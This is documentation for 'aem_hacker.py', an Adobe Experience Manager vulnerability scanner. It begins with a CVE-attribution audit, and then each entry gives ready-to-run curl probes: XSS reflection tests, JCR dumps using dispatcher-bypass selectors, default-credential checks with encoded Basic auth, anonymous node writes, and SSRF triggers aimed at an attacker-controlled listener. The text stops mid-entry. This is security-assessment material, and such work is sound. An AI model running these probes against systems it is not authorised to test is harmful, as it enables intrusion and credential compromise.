# AEM Hacker – CVE & Vulnerability Coverage Wiki

This document describes every check implemented in `aem_hacker.py`.  For each
check you will find:

* **Handler name** – the value you pass to `--handler`
* **Finding name** – the label printed in tool output
* **Vulnerability class** – e.g. SSRF, XSS, XXE, RCE …
* **CVE** – assigned identifier(s) where applicable
* **CVSS score & rating** – exact NVD base score where an official CVE exists
  (v3.1 where available, v2.0 otherwise); scores prefixed with `~` in the
  quick-reference table are internal severity estimates for misconfigurations
  that have no assigned CVE and are **not** official NVD scores
* **Affected AEM versions** – known affected range
* **Why the vulnerability exists** – short technical explanation
* **How to test manually with `curl`** – a copy-paste command you can run
  against a live target (replace `https://TARGET` with the real URL)

> **Note:** SSRF checks require an externally reachable host that can receive
> HTTP callbacks.  Replace `YOURHOST` / `YOURPORT` in the curl examples with
> your VPS address.  SSRF findings are printed only after the tool waits ≈10 s
> for an inbound callback; the curl commands below show just the trigger
> request.

---

## ⚠️ Provenance and audit status

**Two checks were documented as implemented but were unreachable.**
`currentuser_servlet` and `reports` had their `@register` decorator commented out,
so the README claimed them while they could never run. They are registered again
and documented below — but as **opt-in**, and the reason matters:

| | date | what |
|---|---|---|
| `ByQwert` added both, enabled | 2019-03-16 | `b65466a` |
| `0ang3el` commented both out | 2020-01-03 | `0dbb87d` "Tooling update" — in the same commit that registered four *other* checks |

So this was not an accident. `currentuser_servlet` brute-forces credentials, which
its two neighbours `loginstatus_servlet` and `userinfo_servlet` already do and
which stayed enabled — the author kept two of the three, which reads as a
deliberate de-duplication. `reports` is low-value information disclosure.

**The defect was therefore in the documentation, not the code.** Claiming three
checks where the author ships two is wrong; silently re-adding the third to the
default sweep would override the maintainer's judgement. Both are now registered,
listed by `--listhandlers`, documented here, and runnable with
`--handler <name>` — but excluded from a plain run, which also announces what it
left out. Re-enabling them by default is a one-line change
(`@register(..., default=True)`) if you disagree with the de-duplication.

A regression test now fails if any check becomes unreachable, another fails if
this document and the code disagree about which checks exist, and a third pins
that these two stay opt-in.

**Every CVE attribution in the five checks added by the Copilot PRs was wrong.**
Each was checked against the vendor bulletin it cited, and in all five cases the
CVE belongs to a different product, a different vulnerability class, a different
bulletin, or a different severity:

| Handler | Claimed | Actually |
|---|---|---|
| `ssrf_cve_2021_40722` | SSRF, 7.5 High, APSB21-99 | **XXE → RCE, 9.8 Critical, [APSB21-103](https://helpx.adobe.com/security/products/experience-manager/apsb21-103.html)**. AEM 6.5.10.0 and earlier. Detected by submitting external-entity XML, which this check does not do. The nearest AEM SSRF is CVE-2021-28627 (APSB21-39, 5.4, **PR:L** — not unauthenticated). |
| `auth_bypass_cve_2023_38205` | AEM auth bypass, 9.8, APSB23-43 | **CVE-2023-38205 is Adobe _ColdFusion_** ([APSB23-47](https://helpx.adobe.com/security/products/coldfusion/apsb23-47.html)), improper access control, **7.5**, a *double-dot* bypass — nothing to do with AEM. [APSB23-43](https://helpx.adobe.com/security/products/experience-manager/apsb23-43.html) is an AEM bulletin but covers reflected XSS (CVE-2023-38214/38215, 5.4). The bypass this check actually probes is real but **has no CVE** (Detectify, 2021). |
| `xss_aem_forms` | AEM Forms reflected XSS, CVE-2021-36063, APSB21-77 | **CVE-2021-36063 is Adobe _Connect_** ([APSB21-66](https://helpx.adobe.com/security/products/connect/apsb21-66.html)), 11.2.2 and earlier. Not an AEM issue. The AEM Forms XSS issues are the APSB21-103 family (CVE-2021-44178 reflected; CVE-2021-43761/43764 stored). |
| `xss_reflected_cve_2022` | CVE-2022-30677 / -30679, both APSB22-40, 6.1 | The two CVEs are in **different bulletins**: CVE-2022-30677 is [APSB22-40](https://helpx.adobe.com/security/products/experience-manager/apsb22-40.html), CVE-2022-30679 is [APSB22-59](https://helpx.adobe.com/security/products/experience-manager/apsb22-59.html). Both are **5.4**, not 6.1, and both are **PR:L / UI:R** — they need a low-privilege authenticated user and user interaction, so an anonymous probe cannot establish that an instance is CVE-affected. |
| `open_redirect` | AEM open redirect, CVE-2023-29297, 6.1 | **CVE-2023-29297 is Adobe _Commerce / Magento_** (template injection, [APSB23-35](https://helpx.adobe.com/security/products/magento/apsb23-35.html)). AEM's login-page open redirect is **CVE-2023-29307** ([APSB23-31](https://helpx.adobe.com/security/products/experience-manager/apsb23-31.html)), rated **3.5 Low**, and also **PR:L / UI:R**. |

**What this means for these five checks.** The *techniques* they probe are real
AEM weakness classes. The CVE numbers, severities and preconditions are not. None
of the five has been validated to true-positive against a genuinely vulnerable
AEM, and a clean result does not mean the instance is unaffected. They are
therefore marked `experimental`:

* they still run by default, but every finding they produce is prefixed
  **`[UNVERIFIED CHECK]`** so a report cannot present them as confirmed;
* `--strict` skips them entirely, for when you want only checks whose detection
  logic has been validated.

The handler names still contain the old CVE numbers, because renaming them would
break `--handler` for existing scripts. The names are historical; the audit notes
in each function's docstring give the correct attribution.

---

## 🔑 Authenticated checks (`--creds`)

Most AEM CVEs are **low-privilege (`PR:L`) or require user interaction
(`UI:R`)**, which an unauthenticated scanner cannot detect. APSB22-59 is a good
illustration: roughly 35 CVEs, almost all stored/reflected XSS at `PR:L/UI:R`.
Before `--creds` existed this tool could not meaningfully check any of them, and
an anonymous "XSS check" for such a CVE can only ever show the reflection
primitive.

```
python3 aem_hacker.py -u https://aem.webapp --host your_vps --creds author:author
```

A password on the command line is visible in `ps`, `/proc/*/cmdline` and shell
history, so two off-the-command-line routes are also accepted — they combine
with `--creds`:

```
chmod 600 ~/.aem-creds          # one 'user:password' per line
python3 aem_hacker.py -u https://aem.webapp --creds-file ~/.aem-creds
AEM_HACKER_CREDS='author:letmein' python3 aem_hacker.py -u https://aem.webapp
```

`--creds-file` warns when the file is readable by other users. A credential
outside ISO-8859-1 is rejected, because RFC 7617 Basic authentication cannot
transmit it (and UTF-8 would send mojibake that silently never validates).

Which checks use it:

| Check | Without `--creds` | With `--creds` |
|---|---|---|
| `xss_aem_forms`, `xss_reflected_cve_2022`, `open_redirect` | anonymous | sends the credential — the `PR:L` case Adobe actually describes |
| `loginstatus_servlet`, `userinfo_servlet`, `currentuser_servlet` | tries the built-in default-credential list | tries the built-in list **plus** the supplied credentials |
| `version_disclosure` (product-info probe) | `admin:admin`, as it always has | sends the supplied credential |

Properties worth knowing:

* With no `--creds`, the credential checks probe **the same set of credentials
  as before** and the anonymous path is unchanged. No check is new to the default
  sweep: `currentuser_servlet` and `reports` are reachable but opt-in, as the
  maintainer intended.
* Supplied credentials are **added to** the built-in default-credential list, not
  substituted for it — using `--creds` to reach a `PR:L` check does not silently
  disable "AEM with default credentials" detection.
* Only the **first** credential is used for session-style probes, so supplying
  several does not multiply the request count. The default-credential checks try
  all of them in place of their built-in list.
* The password **value** is never written to a finding, to stdout, or to an error
  message; only the username is reported. Two rejection messages disclose its
  *length* rather than its content.
* CR, LF and NUL are rejected in a credential, because the value is interpolated
  into an HTTP header and one that could terminate the header would allow request
  smuggling.

**Verified as correct** (spot-checked against their vendor bulletins):
CVE-2019-8086/9.8, CVE-2016-7882/6.1, CVE-2018-5006/7.5, CVE-2018-12809/7.5,
CVE-2015-1833/9.1 — the upstream checks from @0ang3el.

---

## Quick-Reference Table

`⚠` marks an **experimental** check: its detection logic is unvalidated and its
CVE attribution was corrected during audit — see
[Provenance and audit status](#-provenance-and-audit-status). Scores marked
"est." are internal estimates, not vendor ratings.

| # | Handler | CVE | CVSS | Rating | Vuln Class |
|---|---------|-----|------|--------|------------|
| 1 | `set_preferences` | — | ~4.3 | Medium | Reflected XSS |
| 2 | `merge_metadata` | — | ~4.3 | Medium | Reflected XSS |
| 3 | `get_servlet` | — | ~7.5 | High | Info Disclosure |
| 4 | `querybuilder_servlet` | — | ~7.5 | High | Info Disclosure |
| 5 | `gql_servlet` | — | ~7.5 | High | Info Disclosure |
| 6 | `guide_internal_submit_servlet` | CVE-2019-8086 | 9.8 | Critical | XXE |
| 7 | `post_servlet` | — | ~8.8 | High | Persistent XSS / RCE |
| 8 | `create_new_nodes` | — | ~8.8 | High | Persistent XSS / RCE |
| 9 | `create_new_nodes2` | — | ~8.8 | High | Persistent XSS / RCE |
| 10 | `loginstatus_servlet` | — | ~9.8 | Critical | Auth Bypass / Credential Brute-force |
| 11 | `userinfo_servlet` | — | ~7.5 | High | Info Disclosure / Credential Brute-force |
| 11b | `currentuser_servlet` | — | ~7.5 | High | Info Disclosure / Credential Brute-force |
| 11c | `reports` | — | ~5.3 | Medium | Info Disclosure |
| 12 | `felix_console` | — | ~9.8 | Critical | RCE |
| 13 | `wcmdebug_filter` | CVE-2016-7882 | 6.1 | Medium | Reflected XSS |
| 14 | `wcmsuggestions_servlet` | — | ~6.1 | Medium | Reflected XSS |
| 15 | `crxde_crx` | — | ~7.5 | High | Info Disclosure / RCE |
| 16 | `salesforcesecret_servlet` | CVE-2018-5006 | 7.5 | High | SSRF |
| 17 | `reportingservices_servlet` | CVE-2018-12809 | 7.5 | High | SSRF |
| 18 | `sitecatalyst_servlet` | — | ~7.5 | High | SSRF → RCE |
| 19 | `autoprovisioning_servlet` | — | ~7.5 | High | SSRF → RCE |
| 20 | `opensocial_proxy` | — | ~7.5 | High | SSRF |
| 21 | `opensocial_makeRequest` | — | ~7.5 | High | SSRF |
| 22 | `swf_xss` | — | ~6.1 | Medium | Reflected XSS (Flash) |
| 23 | `externaljob_servlet` | — | ~9.8 | Critical | Java Deserialization |
| 24 | `webdav` | CVE-2015-1833 | 9.1 | Critical | XXE / Path Traversal |
| 25 | `groovy_console` | — | ~9.8 | Critical | RCE |
| 26 | `acs_tools` | — | ~9.8 | Critical | RCE |
| 27 | `version_disclosure` | — | ~5.3 | Medium | Info Disclosure (Hardening) |
| 28 | `open_redirect` ⚠ | CVE-2023-29307 (APSB23-31) | 3.5 | Low | Open Redirect |
| 29 | `auth_bypass_cve_2023_38205` ⚠ | — (no CVE; Detectify 2021) | ~8.8 est. | High | Auth Bypass → RCE |
| 30 | `xss_aem_forms` ⚠ | — (no CVE) | ~6.1 est. | Medium | Reflected XSS |
| 31 | `xss_reflected_cve_2022` ⚠ | CVE-2022-30677 (APSB22-40) / CVE-2022-30679 (APSB22-59) | 5.4 | Medium | Reflected XSS |
| 32 | `ssrf_cve_2021_40722` ⚠ | — (not CVE-2021-40722) | ~7.5 est. | High | SSRF |

---

## Detailed Entries

---

### 1 · `set_preferences` — Exposed setPreferences.jsp (Reflected XSS)

| Field | Value |
|-------|-------|
| Finding name | `SetPreferences` |
| Vulnerability class | Reflected XSS |
| CVE | — (misconfiguration) |
| CVSS | ~4.3 (Medium) |
| Affected versions | AEM 5.x – 6.x (CRXDE enabled) |

**Why it exists**
`/crx/de/setPreferences.jsp` is a CRXDE Lite helper page that echoes the
`keymap` query parameter back into the response without HTML-encoding it.  When
CRXDE Lite is left accessible on a production instance, an attacker can craft a
URL that runs arbitrary JavaScript in the victim's browser.

**Manual curl test**

```bash
curl -sk 'https://TARGET/crx/de/setPreferences.jsp?keymap=<script>alert(1)</script>&language=0' \
  | grep -o '<script>alert(1)</script>'
```

A vulnerable instance returns the unencoded string in the HTTP 400 response body.

---

### 2 · `merge_metadata` — Exposed MergeMetadataServlet (Reflected XSS)

| Field | Value |
|-------|-------|
| Finding name | `MergeMetadataServlet` |
| Vulnerability class | Reflected XSS |
| CVE | — (misconfiguration) |
| CVSS | ~4.3 (Medium) |
| Affected versions | AEM 6.x with DAM enabled |

**Why it exists**
`/libs/dam/merge/metadata` is a DAM servlet that accepts an asset `path`
parameter and returns merged metadata as JSON.  On unpatched or misconfigured
instances the response can include unsanitized user-controlled input, enabling
injection into pages that render that JSON without escaping.

**Manual curl test**

```bash
curl -sk 'https://TARGET/libs/dam/merge/metadata.html?path=/etc&.ico' \
  | python3 -m json.tool | grep -i assetPaths
```

A non-empty `assetPaths` array in the JSON response confirms exposure.

---

### 3 · `get_servlet` — Exposed DefaultGetServlet (Information Disclosure)

| Field | Value |
|-------|-------|
| Finding name | `DefaultGetServlet` |
| Vulnerability class | Sensitive Information Disclosure |
| CVE | — (misconfiguration) |
| CVSS | ~7.5 (High) |
| Affected versions | All AEM versions |

**Why it exists**
Apache Sling's `DefaultGetServlet` serialises JCR nodes to JSON when a `.json`
extension is appended to any resource URL.  Dispatcher rules or authentication
requirements are frequently absent or bypassed with URL-encoding tricks
(`/etc.json`, `/home.1.json`, `....4.2.1....json`).  Exposed nodes can contain
service credentials, encryption keys, user passwords, API tokens, and other
secrets stored in the JCR.

**Manual curl test**

```bash
# Basic dump of /etc node
curl -sk 'https://TARGET/etc.json' | python3 -m json.tool

# Bypass dispatcher with selector trick
curl -sk 'https://TARGET/etc....4.2.1....json' | python3 -m json.tool

# Check /home/users for user nodes
curl -sk 'https://TARGET/home/users.1.json' | python3 -m json.tool
```

A valid JSON response containing `jcr:primaryType` confirms the node is readable.

---

### 4 · `querybuilder_servlet` — Exposed QueryBuilder (Information Disclosure)

| Field | Value |
|-------|-------|
| Finding name | `QueryBuilderJsonServlet` / `QueryBuilderFeedServlet` |
| Vulnerability class | Sensitive Information Disclosure |
| CVE | — (misconfiguration) |
| CVSS | ~7.5 (High) |
| Affected versions | AEM 5.x – 6.x |

**Why it exists**
AEM's QueryBuilder API (`/bin/querybuilder.json`) and Feed servlet
(`/bin/querybuilder.feed`) allow full-text JCR queries over HTTP without
authentication when the Dispatcher is not properly configured.  An attacker can
enumerate all users, extract password hashes, OAuth tokens, and other sensitive
JCR properties.

**Manual curl test**

```bash
# Enumerate user accounts
curl -sk 'https://TARGET/bin/querybuilder.json?type=rep:User&p.limit=-1' \
  | python3 -m json.tool

# Dispatcher bypass variant
curl -sk 'https://TARGET/bin/querybuilder.json.css' \
  -d 'type=rep:User&p.limit=-1' | python3 -m json.tool
```

A response with a `hits` array confirms exposure.

---

### 5 · `gql_servlet` — Exposed GQL Servlet (Information Disclosure)

| Field | Value |
|-------|-------|
| Finding name | `GQLServlet` |
| Vulnerability class | Sensitive Information Disclosure |
| CVE | — (misconfiguration) |
| CVSS | ~7.5 (High) |
| Affected versions | AEM 5.x – 6.x |

**Why it exists**
The GQL (Graph Query Language) servlet at `/bin/wcm/search/gql.json` executes
Jackrabbit GQL queries without requiring authentication on misconfigured
instances.  Like QueryBuilder, this exposes the full JCR content tree to
unauthenticated users.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/bin/wcm/search/gql.json?query=type:User%20limit:..1&pathPrefix=&p.ico' \
  | python3 -m json.tool
```

A `hits` array with user node data confirms exposure.

---

### 6 · `guide_internal_submit_servlet` — XXE via GuideInternalSubmitServlet (CVE-2019-8086)

| Field | Value |
|-------|-------|
| Finding name | `GuideInternalSubmitServlet` |
| Vulnerability class | XML External Entity (XXE) |
| CVE | **CVE-2019-8086** |
| CVSS v3.1 | **9.8 (Critical)** |
| Affected versions | AEM 6.3, 6.4.0 – 6.4.4, 6.5.0 (Forms add-on) |
| Adobe bulletin | [APSB19-48](https://helpx.adobe.com/security/products/experience-manager/apsb19-48.html) |

**Why it exists**
Adobe AEM Forms ships `GuideInternalSubmitServlet`, which processes an Adaptive
Form submission payload containing XML (`guidePrefillXml`).  The XML parser was
configured without disabling external entity resolution, so an attacker can
embed a `SYSTEM` entity in the XML to read local files (`/etc/passwd`,
`repository.xml`, credential files) or trigger SSRF to internal services.  The
servlet was reachable without authentication on affected versions.

**Manual curl test**

```bash
# Confirm servlet exposure (benign – no XXE payload)
curl -sk -X POST \
  'https://TARGET/libs/fd/af/components/guideContainer/cq:template.af.internalsubmit.json' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: https://TARGET' \
  --data-urlencode 'guideState={"guideState":{"guideDom":{},"guideContext":{"xsdRef":"","guidePrefillXml":"<afData>TESTTOKEN</afData>"}}}'

# TESTTOKEN appearing in the response confirms the servlet is accessible
```

---

### 7 · `post_servlet` — Exposed SlingPostServlet (Persistent XSS / RCE)

| Field | Value |
|-------|-------|
| Finding name | `POSTServlet` |
| Vulnerability class | Persistent XSS / Remote Code Execution |
| CVE | — (misconfiguration) |
| CVSS | ~8.8 (High) |
| Affected versions | All AEM versions |

**Why it exists**
Apache Sling's `SlingPostServlet` allows creating, modifying, and deleting JCR
nodes via HTTP POST.  If accessible without authentication, an attacker can
write arbitrary content nodes (e.g. storing `<script>` tags in properties
rendered by AEM templates) or – with sufficient privileges – overwrite `/apps`
to achieve server-side code execution.

**Manual curl test**

```bash
# Confirm exposure with the no-operation request
curl -sk -X POST 'https://TARGET/.json' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: https://TARGET' \
  -d ':operation=nop'

# "Null Operation Status: OK" in the response confirms the servlet is reachable
```

---

### 8 · `create_new_nodes` — Unauthenticated JCR Node Creation

| Field | Value |
|-------|-------|
| Finding name | `CreateJCRNodes` |
| Vulnerability class | Persistent XSS / RCE |
| CVE | — (misconfiguration) |
| CVSS | ~8.8 (High) |
| Affected versions | AEM 5.x – 6.x |

**Why it exists**
When anonymous write access is granted to paths under `/content/usergenerated`
(or when default credentials such as `admin:admin` / `author:author` are
active), an unauthenticated attacker can POST new JCR nodes.  These nodes can
hold HTML/script content that gets served by Sling servlets registered by
resource type, resulting in persistent XSS or RCE depending on the target path.

**Manual curl test**

```bash
# Anonymous write attempt
curl -sk -X POST 'https://TARGET/content/usergenerated/testnode' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: https://TARGET' \
  -d 'a=b'

# "Parent Location" in the HTML response and HTTP 200/201 indicates success
```

---

### 9 · `create_new_nodes2` — JCR Node Creation via Geometrixx Sample Users

| Field | Value |
|-------|-------|
| Finding name | `CreateJCRNodes 2` |
| Vulnerability class | Persistent XSS / RCE |
| CVE | — (sample content misconfiguration) |
| CVSS | ~8.8 (High) |
| Affected versions | AEM 5.x – 6.x with Geometrixx sample content installed |

**Why it exists**
Adobe's Geometrixx sample content ships default user accounts
(`aparker@geometrixx.info:aparker`, `jdoe@geometrixx.info:jdoe`, etc.) with
write permissions to their own home directories under `/home/users/geometrixx`.
If the sample content is left installed in a production environment, attackers
can authenticate with these well-known credentials and create JCR nodes.

**Manual curl test**

```bash
# aparker@geometrixx.info:aparker encoded as Base64
curl -sk -X POST \
  'https://TARGET/home/users/geometrixx/aparker@geometrixx.info/testnode' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: https://TARGET' \
  -H 'Authorization: Basic YXBhcmtlckBnZW9tZXRyaXh4LmluZm86YXBhcmtlcg==' \
  -d 'a=b'
```

---

### 10 · `loginstatus_servlet` — Exposed LoginStatusServlet (Credential Brute-force)

| Field | Value |
|-------|-------|
| Finding name | `LoginStatusServlet` / `AEM with default credentials` |
| Vulnerability class | Authentication Weakness / Credential Enumeration |
| CVE | — (misconfiguration) |
| CVSS | ~9.8 (Critical) |
| Affected versions | All AEM versions |

**Why it exists**
`/system/sling/loginstatus` returns a JSON response indicating whether the
supplied HTTP Basic credentials are valid (`authenticated=true`).  When exposed
without rate-limiting, this becomes an oracle for credential brute-forcing.
Combined with usernames harvested from JCR node attributes
(`jcr:createdBy`, `jcr:lastModifiedBy`), an attacker can confirm whether
default or common passwords are in use.

**Manual curl test**

```bash
# Check if servlet is accessible anonymously
curl -sk 'https://TARGET/system/sling/loginstatus.json'

# Test admin:admin credential pair
curl -sk 'https://TARGET/system/sling/loginstatus.json' \
  -H 'Authorization: Basic YWRtaW46YWRtaW4='

# "authenticated=true" in the body means the password is correct
```

---

### 11 · `userinfo_servlet` — Exposed UserInfoServlet (Information Disclosure)

| Field | Value |
|-------|-------|
| Finding name | `UserInfoServlet` / `AEM with default credentials` |
| Vulnerability class | Information Disclosure / Authentication Weakness |
| CVE | — (misconfiguration) |
| CVSS | ~7.5 (High) |
| Affected versions | AEM 5.x – 6.x |

**Why it exists**
`/libs/cq/security/userinfo.json` returns the currently authenticated user's
ID.  When accessible, it can be used to verify credential pairs and discover
valid accounts.  Combined with default passwords it confirms full account
compromise.

**Manual curl test**

```bash
curl -sk 'https://TARGET/libs/cq/security/userinfo.json' \
  -H 'Authorization: Basic YWRtaW46YWRtaW4='

# A non-anonymous "userID" field in the response confirms access
```

---

### 11b · `currentuser_servlet` — Exposed CurrentUserServlet (Credential Brute-force)

| Field | Value |
|-------|-------|
| Finding name | `CurrentUserServlet` / `AEM with default credentials` |
| Vulnerability class | Information Disclosure / Authentication Weakness |
| CVE | — (misconfiguration) |
| CVSS | ~7.5 (High) |
| Affected versions | AEM 6.x |

> **Opt-in, not in the default sweep.** Its `@register` decorator was commented
> out, so the README listed it as implemented while it could never run. It is
> registered again and covered by tests, but deliberately left out of a plain
> run: `loginstatus_servlet` and `userinfo_servlet` already perform this
> brute-force and the author kept two of the three. Run it with
> `--handler currentuser_servlet`.

**Why it exists**
`/libs/granite/security/currentuser.json` returns the authenticated principal's
ID. When reachable anonymously it is a credential oracle: usable usernames can be
harvested from `jcr:createdBy` / `cq:lastModifiedBy` on any JCR node, and each
default password can be confirmed in one request.

A login counts as successful only when the response is a 200 **and** names a
non-anonymous principal. An earlier version tested merely for the absence of the
string `anonymous`, which reported working default credentials on every 401/403
and error page.

**Manual curl test**

```bash
# Unauthenticated probe
curl -sk 'https://TARGET/libs/granite/security/currentuser.json'

# Credential confirmation
curl -sk 'https://TARGET/libs/granite/security/currentuser.json' \
  -H 'Authorization: Basic YWRtaW46YWRtaW4='

# "authorizableId":"admin" confirms the default credential works
```

---

### 11c · `reports` — Exposed AEM Reports (Information Disclosure)

| Field | Value |
|-------|-------|
| Finding name | `Reports` |
| Vulnerability class | Information Disclosure |
| CVE | — (misconfiguration) |
| CVSS | ~5.3 (Medium) |
| Affected versions | AEM 6.x |

> **Opt-in, not in the default sweep**, for the same reason as
> `currentuser_servlet`: its `@register` decorator was commented out while the
> README still claimed it. Run it with `--handler reports`.

**Why it exists**
The reporting endpoints under `/libs/granite/content/reports` and the classic
`/cq/reports` path expose operational data — user activity, audit trails,
inventory and usage statistics — that is not meant to be publicly readable and
often aggregates internal usernames and system details.

**Manual curl test**

```bash
curl -sk 'https://TARGET/libs/granite/content/reports.json'
curl -sk 'https://TARGET/cq/reports.json'

# A 200 with a JSON reports document confirms exposure
```

---

### 12 · `felix_console` — Exposed Felix OSGi Console (RCE)

| Field | Value |
|-------|-------|
| Finding name | `FelixConsole` |
| Vulnerability class | Remote Code Execution |
| CVE | — (default credentials + misconfiguration) |
| CVSS | ~9.8 (Critical) |
| Affected versions | All AEM versions |

**Why it exists**
The Apache Felix OSGi Web Console at `/system/console/bundles` allows
uploading and installing OSGi bundles.  AEM ships with this console enabled and
protected by HTTP Basic auth.  When the `admin:admin` credential is unchanged
(the default), or when the console is accessible without authentication, an
attacker can install a malicious bundle that executes arbitrary Java code inside
the AEM JVM.

**Manual curl test**

```bash
# Confirm exposure
curl -sk 'https://TARGET/system/console/bundles' \
  -H 'Authorization: Basic YWRtaW46YWRtaW4=' | grep -o 'Web Console - Bundles'
```

Reference: <https://github.com/0ang3el/aem-rce-bundle>

---

### 13 · `wcmdebug_filter` — WCMDebugFilter Reflected XSS (CVE-2016-7882)

| Field | Value |
|-------|-------|
| Finding name | `WCMDebugFilter` |
| Vulnerability class | Reflected Cross-Site Scripting (XSS) |
| CVE | **CVE-2016-7882** |
| CVSS v3.1 | 6.1 (Medium) |
| Affected versions | AEM 6.0 – 6.2 (patched in 6.2 SP1) |
| Adobe bulletin | [APSB16-38](https://helpx.adobe.com/security/products/experience-manager/apsb16-38.html) |

**Why it exists**
`WCMDebugFilter` is a Sling servlet filter that activates when the query
parameter `debug=layout` is present.  On vulnerable versions, the filter
reflected request metadata (`sel=`, `res=`, etc.) into the HTML response without
output encoding.  An attacker can craft a URL that causes script execution in
the victim's browser.

**Manual curl test**

```bash
curl -sk 'https://TARGET/.json?debug=layout' | grep -E 'sel=|res='

# A response containing those fields in rendered HTML confirms the filter is
# active – add a script tag to the request to achieve XSS
```

Reference: <https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c>

---

### 14 · `wcmsuggestions_servlet` — WCMSuggestionsServlet Reflected XSS

| Field | Value |
|-------|-------|
| Finding name | `WCMSuggestionsServlet` |
| Vulnerability class | Reflected Cross-Site Scripting (XSS) |
| CVE | — (misconfiguration) |
| CVSS | ~6.1 (Medium) |
| Affected versions | AEM 5.x – 6.x |

**Why it exists**
`/bin/wcm/contentfinder/connector/suggestions` is a content-finder autocomplete
endpoint.  The `pre` and `post` query parameters are echoed into the JSON
response without HTML encoding, so any page that renders that JSON inline
becomes vulnerable to XSS.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/bin/wcm/contentfinder/connector/suggestions.json?query_term=path%3a/&pre=<1337abcdef>&post=yyyy' \
  | grep '1337abcdef'

# Presence of <1337abcdef> in the response confirms XSS
```

---

### 15 · `crxde_crx` — Exposed CRXDE Lite / CRX Explorer / Package Manager

| Field | Value |
|-------|-------|
| Finding name | `CRXDE Lite/CRX` |
| Vulnerability class | Information Disclosure / RCE |
| CVE | — (misconfiguration) |
| CVSS | ~7.5 (High) |
| Affected versions | All AEM versions |

**Why it exists**
CRXDE Lite (`/crx/de`), CRX Explorer (`/crx/explorer`), and Package Manager
(`/crx/packmgr`) are development and administration tools that are bundled with
AEM but should be disabled on production systems.  When exposed, they provide
read/write access to the entire JCR repository and allow deploying ZIP packages
that can override `/apps` scripts to achieve RCE.

**Manual curl test**

```bash
# CRXDE Lite
curl -sk 'https://TARGET/crx/de/index.jsp' | grep -o 'CRXDE Lite'

# CRX Explorer
curl -sk 'https://TARGET/crx/explorer/browser/index.jsp' | grep -o 'Content Explorer'

# Package Manager
curl -sk 'https://TARGET/crx/packmgr/index.jsp' | grep -o 'CRX Package Manager'
```

---

### 16 · `salesforcesecret_servlet` — SSRF via SalesforceSecretServlet (CVE-2018-5006)

| Field | Value |
|-------|-------|
| Finding name | `SalesforceSecretServlet` |
| Vulnerability class | Server-Side Request Forgery (SSRF) |
| CVE | **CVE-2018-5006** |
| CVSS v3.0 | **7.5 (High)** |
| Affected versions | AEM 6.2, 6.3.0 – 6.3.2, 6.4.0 |
| Adobe bulletin | [APSB18-23](https://helpx.adobe.com/security/products/experience-manager/apsb18-23.html) |

**Why it exists**
`/libs/mcm/salesforce/customer.json` accepts an `authorization_url` or
`instance_url` parameter that is used directly in a server-side HTTP request to
fetch OAuth tokens.  The parameter value is not validated against an allow-list,
so an attacker can force AEM to connect to an arbitrary host, exfiltrate
instance-level secrets, or use the SSRF to pivot to internal services.

**Manual curl test**

```bash
# Replace YOURHOST:YOURPORT with a netcat/HTTP listener you control
curl -sk \
  'https://TARGET/libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url=http://YOURHOST:YOURPORT/ssrf-hit&customer_key=z&customer_secret=z&redirect_uri=x&code=e'

# An inbound connection to your listener confirms SSRF
```

---

### 17 · `reportingservices_servlet` — SSRF via ReportingServicesServlet (CVE-2018-12809)

| Field | Value |
|-------|-------|
| Finding name | `ReportingServicesServlet` |
| Vulnerability class | Server-Side Request Forgery (SSRF) |
| CVE | **CVE-2018-12809** |
| CVSS v3.0 | **7.5 (High)** |
| Affected versions | AEM 6.2, 6.3 – 6.3.2, 6.4 – 6.4.1 |
| Adobe bulletin | [APSB18-23](https://helpx.adobe.com/security/products/experience-manager/apsb18-23.html) |

**Why it exists**
`/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet` proxies
requests to Adobe SiteCatalyst/Analytics using a `url` query parameter.  No
allow-list is enforced, so an attacker can direct the request to any host
reachable from the AEM server.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url=http://YOURHOST:YOURPORT/ssrf-hit%23&q=a'
```

---

### 18 · `sitecatalyst_servlet` — SSRF via SiteCatalystServlet (SSRF → RCE)

| Field | Value |
|-------|-------|
| Finding name | `SiteCatalystServlet` |
| Vulnerability class | Server-Side Request Forgery → Remote Code Execution |
| CVE | — (researcher-found) |
| CVSS | ~7.5 (High) |
| Affected versions | AEM ≤ 6.2-SP1-CFP7 on Jetty (default install) |

**Why it exists**
`/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet` accepts a
`datacenter` parameter used verbatim to build a server-side HTTP request.  On
older AEM versions running on the embedded Jetty server, `aem_ssrf2rce.py` can
chain this SSRF with AEM's replication API to write a JSP shell to the
repository and achieve full RCE.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter=http://YOURHOST:YOURPORT/ssrf-hit%23&company=xxx&username=zzz&secret=yyyy'
```

Reference: <https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=87>

---

### 19 · `autoprovisioning_servlet` — SSRF via AutoProvisioningServlet (SSRF → RCE)

| Field | Value |
|-------|-------|
| Finding name | `AutoprovisioningServlet` |
| Vulnerability class | Server-Side Request Forgery → Remote Code Execution |
| CVE | — (researcher-found) |
| CVSS | ~7.5 (High) |
| Affected versions | AEM ≤ 6.2-SP1-CFP7 on Jetty (default install) |

**Why it exists**
`/libs/cq/cloudservicesprovisioning/content/autoprovisioning` issues a
server-side HTTP request to an endpoint controlled by a request parameter.  The
same SSRF-to-RCE chain exploitable via `SiteCatalystServlet` applies here.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json?authorizableId=x&path=http://YOURHOST:YOURPORT/ssrf-hit%23'
```

---

### 20 · `opensocial_proxy` — SSRF via OpenSocial (Shindig) Proxy

| Field | Value |
|-------|-------|
| Finding name | `Opensocial (shindig) proxy` |
| Vulnerability class | Server-Side Request Forgery (SSRF) |
| CVE | — |
| CVSS | ~7.5 (High) |
| Affected versions | AEM versions bundling Apache Shindig |

**Why it exists**
